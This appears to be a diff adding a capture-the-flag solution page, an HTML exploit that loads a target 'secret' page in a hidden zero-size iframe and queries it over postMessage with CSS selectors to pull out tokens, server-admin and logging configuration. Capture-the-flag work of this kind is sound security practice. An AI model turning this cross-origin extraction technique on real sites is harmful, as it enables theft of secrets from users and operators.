@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CTF18 PostMessage Extractor</title>
+  <style>
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif; padding: 16px; }
+    h1 { font-size: 20px; }
+    .card { border: 1px solid #ddd; border-radius: 8px; padding: 12px; margin: 12px 0; }
+    .label { font-weight: 600; }
+    #results p { margin: 6px 0; }
+    iframe { width: 0; height: 0; border: 0; position: absolute; }
+  </style>
+  <script>
+    // Helper to append a line of text to the results container
+    function appendResult(text) {
+      const p = document.createElement('p');
+      p.textContent = text.trim();
+      document.getElementById('results').appendChild(p);
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      const frame = document.getElementById('secret');
+
+      // Collect results coming back from the secret iframe
+      window.addEventListener('message', (event) => {
+        if (typeof event.data === 'string' && event.data.trim().length > 0) {
+          appendResult(event.data);
+        }
+      });
+
+      // Send a series of CSS selectors to the secret page.
+      // The target page will use document.querySelector(selector) and return its text nodes.
+      const selectors = [
+        // Broad selectors first
+        'web-server-config',
+        'web-server-config > server-settings',
+        'web-server-config > logging',
+        // Specific interesting values
+        '#token1 > value',
+        '#token2 > value',
+        'server-settings > document-root',
+        'server-settings > server-admin',
+        'logging > log-level',
+        'logging > log-directory',
+        // As a catch-all, try body as well
+        'body'
+      ];
+
+      function sendAll() {
+        selectors.forEach((sel) => {
+          try {
+            frame.contentWindow.postMessage(sel, '*');
+          } catch (err) {
+            appendResult('[postMessage error] ' + String(err));
+          }
+        });
+      }
+
+      // Give the iframe a moment to load before sending messages
+      setTimeout(sendAll, 300);
+    });
+  </script>
+</head>
+<body>
+  <h1>CTF #18: PostMessage Extractor</h1>
+  <div class="card">
+    <div class="label">Instructions</div>
+    <div>Open the devtools console if you like, but results will also display below.</div>
+  </div>
+  <div class="card">
+    <div class="label">Extracted values</div>
+    <div id="results"></div>
+  </div>
+
+  <iframe id="secret" src="https://web-post-mess-web.purple.ctfcompetition.com/secret"></iframe>
+</body>
+</html>
+
+
